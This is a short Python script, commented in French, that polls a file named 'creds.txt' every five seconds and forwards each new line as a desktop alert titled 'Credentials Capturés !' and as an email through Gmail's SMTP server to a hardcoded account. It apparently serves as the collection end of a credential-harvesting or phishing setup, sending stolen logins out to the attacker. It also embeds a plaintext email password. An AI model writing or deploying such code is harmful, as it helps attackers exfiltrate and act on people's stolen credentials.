import time
import smtplib
from email.mime.text import MIMEText
from plyer import notification  # pour notification sur PC (Windows, Linux, Mac)

# Configs email
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
EMAIL = 'Credentials@gmail.com'
PASSWORD = '1234@5678a'

def send_email(subject, body, to_email):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL
    msg['To'] = to_email

    server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    server.starttls()
    server.login(EMAIL, PASSWORD)
    server.send_message(msg)
    server.quit()

def notify_and_email(credentials):
    # Notification desktop
    notification.notify(
        title="Credentials Capturés !",
        message=credentials,
        timeout=5
    )
    # Envoi email
    send_email("Nouveaux Credentials Capturés", credentials, EMAIL)

def watch_file(file_path):
    seen_lines = set()
    while True:
        with open(file_path, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line not in seen_lines and line.strip():
                    notify_and_email(line.strip())
                    seen_lines.add(line)
        time.sleep(5)  # vérifier toutes les 5 secondes

if __name__ == "__main__":
    watch_file("creds.txt")
